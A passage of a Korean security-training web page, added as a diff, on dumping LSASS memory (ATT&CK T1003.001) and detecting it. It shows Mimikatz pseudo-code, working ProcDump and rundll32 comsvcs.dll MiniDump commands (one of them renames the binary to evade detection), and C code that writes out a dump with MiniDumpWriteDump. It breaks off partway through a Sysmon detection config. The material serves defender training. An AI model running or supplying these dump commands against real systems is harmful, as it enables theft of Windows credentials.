@@ -1,0 +1,850 @@
+<!DOCTYPE html>
+<html lang="ko" class="light" data-technique-id="T1003.001" data-level="intermediate">
+<head>
+    <script>(function(){if(new URLSearchParams(window.location.search).get('preview')==='1')return;try{var k='sb-bnwbybawqrnhznirivfg-auth-token';var s=localStorage.getItem(k);if(!s||!JSON.parse(s)){window.location.replace('/login?redirect='+encodeURIComponent(window.location.href));}}catch(e){window.location.replace('/login');}})();</script>
+    <script>var _eduDynLoaded=false;(async function(){try{var S='https://bnwbybawqrnhznirivfg.supabase.co';var K='sb_publishable_fiXeTnAxpTatUSnC0ZvOWg_x5eSbL1w';var r=await fetch(S+'/rest/v1/edu_html_content?page_id=eq.t1003-001-lsass-memory-intermediate&select=content&limit=1',{headers:{'apikey':K,'Authorization':'Bearer '+K}});if(r.ok){var d=await r.json();if(d&&d.length>0&&d[0].content){_eduDynLoaded=true;document.open();document.write(d[0].content);document.close();return;}}}catch(e){}document.documentElement.classList.add('edu-ready');})();setTimeout(function(){if(!_eduDynLoaded)document.documentElement.classList.add('edu-ready');},3000);</script>
+    <style>html:not(.edu-ready) body{visibility:hidden;}html.edu-ready body{visibility:visible;}</style>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta name="description" content="(주)갓루트(GOTROOT) 사이버보안 교육 — T1003.001 중급: LSASS 메모리 덤프 기법과 탐지">
+    <meta name="author" content="(주)갓루트 GOTROOT">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.tailwindcss.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'self' https://*.supabase.co; frame-src 'none'; object-src 'none'; base-uri 'self';" />
+    <meta http-equiv="X-Content-Type-Options" content="nosniff" /><meta name="referrer" content="strict-origin-when-cross-origin" />
+    <title>GOTROOT EDU | T1003.001 중급: LSASS 메모리 덤프 기법과 탐지 — (주)갓루트</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>tailwind.config={darkMode:'class',theme:{extend:{fontFamily:{sans:['Inter','sans-serif'],mono:['JetBrains Mono','monospace']},colors:{cbg:'#FFF8F0',cyel:'#F4D06F',cteal:'#9DD9D2',cdark:'#1e293b',cgray:'#475569',slate:{850:'#151e2e',900:'#0f172a',950:'#020617'}}}}}</script>
+    <style>
+        body{scroll-behavior:smooth;background-color:#FFF8F0;color:#1e293b;transition:background-color .3s,color .3s;}
+        .glass-panel{background:rgba(255,255,255,0.7);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border:1px solid rgba(59,130,246,0.3);box-shadow:0 8px 32px rgba(30,41,59,0.05);}
+        .dark body{background-color:#0f172a;color:#f8fafc;}.dark .glass-panel{background:rgba(30,41,59,0.7);border:1px solid rgba(59,130,246,0.2);box-shadow:0 8px 32px rgba(0,0,0,0.4);}
+        .hl-teal{color:#0f766e;font-weight:700;}.dark .hl-teal{color:#9DD9D2;}
+        .hl-yel{color:#b45309;font-weight:700;}.dark .hl-yel{color:#F4D06F;}
+        .hl-blue{color:#1d4ed8;font-weight:700;}.dark .hl-blue{color:#60a5fa;}
+        .nav-item.active{background:linear-gradient(90deg,rgba(59,130,246,0.2) 0%,transparent 100%);border-left:4px solid #3b82f6;color:#1d4ed8;font-weight:700;}
+        .dark .nav-item.active{background:linear-gradient(90deg,rgba(96,165,250,0.15) 0%,transparent 100%);border-left:4px solid #60a5fa;color:#60a5fa;}
+        .terminal-bg{background-color:#1e293b;color:#9DD9D2;font-family:'JetBrains Mono',monospace;}
+        ::-webkit-scrollbar{width:8px;}::-webkit-scrollbar-track{background:transparent;}::-webkit-scrollbar-thumb{background:#3b82f6;border-radius:4px;}.dark ::-webkit-scrollbar-thumb{background:#60a5fa;}
+        .drag-item{cursor:grab;user-select:none;transition:transform 0.2s,box-shadow 0.2s;}.drag-item:active{cursor:grabbing;}
+        .drag-item.dragging{opacity:0.5;transform:scale(0.95);}
+        .drop-zone.drag-over{border:2px dashed #3b82f6;background:rgba(59,130,246,0.1);}
+        .match-btn{transition:all 0.2s;cursor:pointer;}.match-btn:hover{transform:scale(1.05);}.match-btn.correct{background:#059669!important;color:white!important;border-color:#059669!important;}.match-btn.wrong{background:#dc2626!important;color:white!important;border-color:#dc2626!important;}
+        .step-btn{transition:all 0.3s;}.step-btn.active{border-color:#3b82f6!important;background:rgba(59,130,246,0.1)!important;}.step-btn.completed{border-color:#059669!important;background:rgba(5,150,105,0.1)!important;}
+        .code-blank{display:inline-block;min-width:80px;border-bottom:2px dashed #3b82f6;padding:0 4px;text-align:center;color:#3b82f6;font-weight:bold;}
+        .code-blank.correct{border-color:#059669;color:#059669;background:rgba(5,150,105,0.1);}.code-blank.wrong{border-color:#dc2626;color:#dc2626;background:rgba(220,38,38,0.1);}
+    </style>
+</head>
+<body class="flex flex-col h-screen overflow-hidden selection:bg-blue-200 selection:text-blue-900 transition-colors duration-300">
+    <!-- Brand Header Bar -->
+    <div class="w-full px-4 py-1.5 flex items-center justify-between border-b border-slate-200 dark:border-slate-700 bg-white/90 dark:bg-slate-900/90 backdrop-blur-sm shrink-0 z-[60]" style="font-family:'JetBrains Mono',monospace;">
+        <div class="flex items-center gap-2"><span style="font-size:9px;font-weight:900;color:#bb3e03;letter-spacing:0.25em;">GOTROOT</span><span style="font-size:8px;color:#94a3b8;">|</span><span style="font-size:8px;color:#64748b;" class="hidden sm:inline">(주)갓루트 · 사이버보안 교육 플랫폼</span></div>
+        <div class="flex items-center gap-3">
+            <span style="font-size:8px;color:#3b82f6;font-weight:700;background:rgba(59,130,246,0.1);padding:2px 8px;border-radius:4px;border:1px solid rgba(59,130,246,0.3);">INTERMEDIATE</span>
+            <button onclick="window.location.href='/'" style="font-size:8px;color:#bb3e03;background:transparent;border:1px solid rgba(187,62,3,0.3);padding:3px 10px;border-radius:4px;cursor:pointer;font-family:inherit;">← 매트릭스 대시보드</button>
+        </div>
+    </div>
+
+    <div class="flex flex-1 overflow-hidden">
+    <!-- Theme Toggle -->
+    <button onclick="toggleTheme()" class="fixed top-12 right-6 z-50 p-3 rounded-full glass-panel hover:scale-110 transition-transform shadow-lg border border-blue-400"><span id="theme-icon" class="text-xl">🌙</span></button>
+    <button onclick="window.location.href='/'" class="fixed top-12 left-4 z-50 md:hidden flex items-center gap-1 glass-panel px-3 py-2 rounded-full text-xs font-bold text-slate-700 dark:text-slate-300 border border-blue-400/50 hover:border-blue-400 shadow transition-all">← 대시보드</button>
+
+    <!-- Sidebar -->
+    <aside class="w-64 glass-panel border-r border-blue-400/30 h-full flex flex-col hidden md:flex shrink-0 z-40">
+        <div class="p-6 border-b border-blue-400/30">
+            <button onclick="window.location.href='/'" class="flex items-center gap-1.5 text-xs text-slate-500 hover:text-blue-700 mb-4 transition-colors group"><span class="group-hover:-translate-x-0.5 transition-transform">←</span><span>대시보드로 돌아가기</span></button>
+            <h1 class="text-xl font-bold font-mono hl-blue tracking-tighter">ATT&CK Matrix</h1>
+            <p class="text-xs text-cgray dark:text-slate-400 mt-2">T1003.001: OS Credential Dumping: LSASS Memory</p>
+            <span class="inline-block mt-2 text-[10px] font-bold bg-blue-500/10 text-blue-600 dark:text-blue-400 border border-blue-400/30 px-2 py-0.5 rounded">🔵 중급 (Intermediate)</span>
+        </div>
+        <nav class="flex-1 overflow-y-auto py-4" id="sidebar-nav">
+            <button onclick="go('ch1')" class="nav-item active w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch1">1. Mimikatz 핵심 코드 분석</button>
+            <button onclick="go('ch2')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch2">2. ProcDump를 이용한 Living-off-the-Land</button>
+            <button onclick="go('ch3')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch3">3. Windows API 호출 분석</button>
+            <button onclick="go('ch4')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch4">4. Sysmon 기반 탐지 규칙</button>
+            <button onclick="go('ch5')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch5">5. Sigma 탐지 규칙 작성</button>
+            <button onclick="go('ch6')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch6">6. 탐지 우회 기법 분석</button>
+            <button onclick="go('ch7')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch7">7. YARA 규칙으로 도구 탐지</button>
+            <button onclick="go('ch8')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch8">8. 방어 아키텍처: 다층 방어</button>
+            <button onclick="go('minilab-0')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="minilab-0">9. Mini Lab — Windows API와 용도 매칭</button>
+            <button onclick="go('minilab-1')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="minilab-1">10. Mini Lab — ProcDump LSASS 덤프 시뮬레이션</button>
+            <button onclick="go('minilab-2')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="minilab-2">11. Mini Lab — Sigma 규칙 빈칸 채우기</button>
+            <button onclick="go('quiz')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="quiz">Q. 종합 퀴즈</button>
+        </nav>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="flex-1 overflow-y-auto h-full relative scroll-smooth" id="main-scroll">
+        <div class="max-w-4xl mx-auto p-6 md:p-12 pb-24 space-y-32">
+
+            <!-- Header -->
+            <header class="text-center pt-8">
+                <div class="inline-block px-4 py-1 rounded-full bg-blue-500/20 border border-blue-400 hl-blue font-mono text-sm mb-4">Credential Access</div>
+                <h1 class="text-4xl md:text-5xl font-extrabold tracking-tight mb-4 text-[#1e293b] dark:text-white">LSASS Memory Dump Techniques &amp; Detection</h1>
+                <p class="text-cgray dark:text-slate-400 text-lg">LSASS 메모리 덤프 기법과 탐지</p>
+                <div class="flex items-center justify-center gap-4 mt-4 text-xs text-slate-500 dark:text-slate-500">
+                    <span>⏱ 약 40분</span><span>·</span><span>📚 8챕터 + 퀴즈</span><span>·</span><span>🧪 3개 미니 랩</span>
+                </div>
+            </header>
+
+            <!-- Overview Panel -->
+            <div class="glass-panel rounded-xl p-8 border-l-4 border-l-blue-500 relative overflow-hidden">
+                <div class="absolute -top-6 -right-6 text-[120px] opacity-[0.04] select-none pointer-events-none">🔬</div>
+                <h2 class="text-2xl font-bold mb-4 text-blue-700 dark:text-blue-400">공격 도구의 코드를 읽고 탐지 규칙을 작성할 수 있나요?</h2>
+                <p class="text-cgray dark:text-slate-300 leading-relaxed mb-6">이 중급 과정에서는 Mimikatz, ProcDump, comsvcs.dll 등 실제 공격 도구의 작동 원리를 코드 수준에서 분석합니다. 또한 Sigma, Sysmon 규칙을 작성하여 이러한 공격을 탐지하는 방법을 학습합니다.</p>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <div class="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-300 dark:border-blue-700 text-center">
+                        <div class="text-2xl mb-2">💻</div>
+                        <div class="font-bold text-sm text-blue-700 dark:text-blue-400">도구 코드 분석</div>
+                        <div class="text-xs text-slate-500 dark:text-slate-400 mt-1">Mimikatz, ProcDump 등의 핵심 코드 로직을 이해합니다</div>
+                    </div>
+                    <div class="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-300 dark:border-blue-700 text-center">
+                        <div class="text-2xl mb-2">📝</div>
+                        <div class="font-bold text-sm text-blue-700 dark:text-blue-400">탐지 규칙 작성</div>
+                        <div class="text-xs text-slate-500 dark:text-slate-400 mt-1">Sigma 규칙과 Sysmon 설정을 작성하여 LSASS 접근을 탐지합니다</div>
+                    </div>
+                    <div class="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-300 dark:border-blue-700 text-center">
+                        <div class="text-2xl mb-2">🔄</div>
+                        <div class="font-bold text-sm text-blue-700 dark:text-blue-400">우회 기법 이해</div>
+                        <div class="text-xs text-slate-500 dark:text-slate-400 mt-1">공격자의 탐지 우회 기법과 그에 대한 대응 방법을 학습합니다</div>
+                    </div>
+                </div>
+                <div class="mt-6 bg-blue-50 dark:bg-blue-900/10 border border-blue-300 dark:border-blue-700 rounded-lg p-4 text-center">
+                    <p class="text-sm text-blue-700 dark:text-blue-400">💡 <strong>이 과정을 마치면</strong> → 고급 과정에서 커스텀 LSASS 덤퍼를 직접 구현하고 Credential Guard 우회 기법을 분석합니다</p>
+                </div>
+            </div>
+
+            <!-- ═══════════════════════════════════════════════ -->
+            <!-- Chapters -->
+            <!-- ═══════════════════════════════════════════════ -->
+            <section id="ch1" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#1.</span> Mimikatz 핵심 코드 분석</h2>
+                <div class="space-y-6">
+                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
+                        <div class="text-2xl mb-2">🔧</div>
+                        <h3 class="font-bold text-lg mb-2 hl-blue">Mimikatz의 sekurlsa 모듈</h3>
+                        <p class="text-cgray dark:text-slate-300 leading-relaxed">Benjamin Delpy가 개발한 Mimikatz는 Windows 자격증명 보안 연구의 핵심 도구입니다. sekurlsa 모듈은 LSASS 프로세스 메모리에서 인증 정보를 추출하는 역할을 합니다. 핵심 API 호출: OpenProcess() → ReadProcessMemory() → 자격증명 구조체 파싱.</p>
+                    </div>
+                    <!-- POC Code Panel -->
+                    <div class="glass-panel rounded-xl overflow-hidden">
+                        <div class="terminal-bg px-4 py-2 flex items-center justify-between border-b border-slate-600">
+                            <div class="flex items-center gap-2">
+                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
+                                <span class="text-xs text-slate-400 ml-2 font-mono">mimikatz_sekurlsa.c</span>
+                            </div>
+                            <span class="text-[10px] text-slate-500 font-mono">C</span>
+                        </div>
+                        <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 코드 — 교육 목적 의사 코드 — 실제 코드와 다릅니다</div>
+                        <div class="terminal-bg p-4 overflow-x-auto">
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">// Mimikatz sekurlsa::logonpasswords 핵심 로직 (의사 코드)</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">HANDLE hProcess = OpenProcess(</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">    PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">    FALSE,</div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">    lsassPid  // LSASS 프로세스 ID</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">);</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">// LSASS 메모리에서 인증 패키지 구조체 탐색</div>
+                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">for (pkg in authPackages) {  // MSV1_0, Kerberos, WDigest...</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">    ReadProcessMemory(hProcess, pkg-&gt;listAddr, &amp;logonList);</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre">    </div>
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">    // 각 로그온 세션에서 자격증명 추출</div>
+                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">    foreach (session in logonList) {</div>
+                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">        decryptCredential(session-&gt;credential, lsaKey);</div>
+                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">        printf(&#34;User: %s\nNTLM: %s\n&#34;, session-&gt;user, ntlmHash);</div>
+                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">    }</div>
+                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">}</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="ch2" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#2.</span> ProcDump를 이용한 Living-off-the-Land</h2>
+                <div class="space-y-6">
+                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
+                        <div class="text-2xl mb-2">🎭</div>
+                        <h3 class="font-bold text-lg mb-2 hl-blue">합법적 도구의 악용 (LotL)</h3>
+                        <p class="text-cgray dark:text-slate-300 leading-relaxed">Living-off-the-Land(LotL) 기법은 시스템에 이미 존재하거나 합법적으로 배포된 도구를 공격에 활용하는 전략입니다. ProcDump는 Microsoft Sysinternals Suite에 포함된 공식 진단 도구이므로, 대부분의 안티바이러스가 이를 차단하지 않습니다.</p>
+                    </div>
+                    <!-- POC Code Panel -->
+                    <div class="glass-panel rounded-xl overflow-hidden">
+                        <div class="terminal-bg px-4 py-2 flex items-center justify-between border-b border-slate-600">
+                            <div class="flex items-center gap-2">
+                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
+                                <span class="text-xs text-slate-400 ml-2 font-mono">procdump_lsass.bat</span>
+                            </div>
+                            <span class="text-[10px] text-slate-500 font-mono">batch</span>
+                        </div>
+                        <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 코드 — 교육 목적 명령어 — 허가된 환경에서만 실행</div>
+                        <div class="terminal-bg p-4 overflow-x-auto">
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">REM ProcDump를 이용한 LSASS 메모리 덤프</div>
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">REM 전제조건: 관리자 권한 CMD</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">REM 방법 1: 프로세스 이름으로 덤프</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">procdump.exe -ma lsass.exe lsass_dump.dmp</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">REM 방법 2: PID로 덤프 (탐지 우회 시도)</div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">for /f &#34;tokens=2&#34; %%i in (&#39;tasklist /FI &#34;IMAGENAME eq lsass.exe&#34; ^| findstr lsass&#39;) do (</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">    procdump.exe -ma %%i C:\temp\debug.dmp -accepteula</div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">)</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">REM 방법 3: 파일명 변경하여 탐지 우회</div>
+                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">copy procdump.exe debug_tool.exe</div>
+                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">debug_tool.exe -ma lsass.exe output.dmp</div>
+                        </div>
+                    </div>
+                    <!-- POC Code Panel -->
+                    <div class="glass-panel rounded-xl overflow-hidden">
+                        <div class="terminal-bg px-4 py-2 flex items-center justify-between border-b border-slate-600">
+                            <div class="flex items-center gap-2">
+                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
+                                <span class="text-xs text-slate-400 ml-2 font-mono">comsvcs_dump.bat</span>
+                            </div>
+                            <span class="text-[10px] text-slate-500 font-mono">batch</span>
+                        </div>
+                        <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 코드 — Windows 내장 DLL 악용 — 교육 목적</div>
+                        <div class="terminal-bg p-4 overflow-x-auto">
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">REM comsvcs.dll 내장 MiniDump 함수 악용</div>
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">REM Windows에 기본 포함된 DLL이므로 추가 도구 불필요</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">REM 1단계: LSASS PID 확인</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">tasklist /FI &#34;IMAGENAME eq lsass.exe&#34;</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">REM 2단계: rundll32를 통한 MiniDump 호출</div>
+                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump ^</div>
+                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">    &lt;LSASS_PID&gt; C:\temp\lsass.dmp full</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">REM PowerShell 원라이너 버전</div>
+                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">$pid = (Get-Process lsass).Id</div>
+                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">rundll32.exe comsvcs.dll, MiniDump $pid dump.dmp full</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="ch3" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#3.</span> Windows API 호출 분석</h2>
+                <div class="space-y-6">
+                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
+                        <div class="text-2xl mb-2">🔌</div>
+                        <h3 class="font-bold text-lg mb-2 hl-blue">핵심 Windows API</h3>
+                        <p class="text-cgray dark:text-slate-300 leading-relaxed">LSASS 메모리 덤프에 사용되는 핵심 Windows API: ① OpenProcess() — 대상 프로세스 핸들 획득. PROCESS_VM_READ 권한 필요. ② MiniDumpWriteDump() — DbgHelp.dll의 함수. 프로세스 메모리를 파일로 저장. ③ NtReadVirtualMemory() — NT Native API. 더 낮은 수준의 메모리 읽기.</p>
+                    </div>
+                    <!-- POC Code Panel -->
+                    <div class="glass-panel rounded-xl overflow-hidden">
+                        <div class="terminal-bg px-4 py-2 flex items-center justify-between border-b border-slate-600">
+                            <div class="flex items-center gap-2">
+                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
+                                <span class="text-xs text-slate-400 ml-2 font-mono">minidump_api.c</span>
+                            </div>
+                            <span class="text-[10px] text-slate-500 font-mono">C</span>
+                        </div>
+                        <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 코드 — API 호출 패턴 분석용 — 교육 목적</div>
+                        <div class="terminal-bg p-4 overflow-x-auto">
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">#include &lt;DbgHelp.h&gt;</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">#pragma comment(lib, &#34;DbgHelp.lib&#34;)</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">// LSASS PID 획득</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">DWORD lsassPid = GetLsassPid();  // tasklist 또는 EnumProcesses</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">// 프로세스 핸들 획득</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">HANDLE hProc = OpenProcess(</div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">    PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,</div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">    FALSE, lsassPid);</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">// 출력 파일 생성</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">HANDLE hFile = CreateFile(L&#34;lsass.dmp&#34;, GENERIC_WRITE,</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">    0, NULL, CREATE_ALWAYS, 0, NULL);</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">// 전체 메모리 덤프 (MiniDumpWithFullMemory)</div>
+                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">BOOL ok = MiniDumpWriteDump(</div>
+                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">    hProc, lsassPid, hFile,</div>
+                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">    MiniDumpWithFullMemory,  // 전체 메모리 포함</div>
+                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">    NULL, NULL, NULL);</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="ch4" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#4.</span> Sysmon 기반 탐지 규칙</h2>
+                <div class="space-y-6">
+                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
+                        <div class="text-2xl mb-2">📡</div>
+                        <h3 class="font-bold text-lg mb-2 hl-blue">Sysmon Event ID 10: ProcessAccess</h3>
+                        <p class="text-cgray dark:text-slate-300 leading-relaxed">Sysmon의 Event ID 10은 한 프로세스가 다른 프로세스의 메모리에 접근할 때 발생합니다. TargetImage 필드가 lsass.exe이고, GrantedAccess에 0x1010(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION) 이상의 권한이 포함되면 의심 대상입니다.</p>
+                    </div>
+                    <!-- POC Code Panel -->
+                    <div class="glass-panel rounded-xl overflow-hidden">
+                        <div class="terminal-bg px-4 py-2 flex items-center justify-between border-b border-slate-600">
+                            <div class="flex items-center gap-2">
+                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
+                                <span class="text-xs text-slate-400 ml-2 font-mono">sysmon-config.xml</span>
+                            </div>
+                            <span class="text-[10px] text-slate-500 font-mono">xml</span>
+                        </div>
+                        <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 코드 — 실제 환경에서 실행하지 마세요</div>
+                        <div class="terminal-bg p-4 overflow-x-auto">
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">&lt;!-- Sysmon 설정: LSASS 메모리 접근 탐지 --&gt;</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">&lt;Sysmon schemaversion=&#34;4.90&#34;&gt;</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">  &lt;EventFiltering&gt;</div>
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">    &lt;!-- LSASS 프로세스 접근 감시 --&gt;</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">    &lt;ProcessAccess onmatch=&#34;include&#34;&gt;</div>
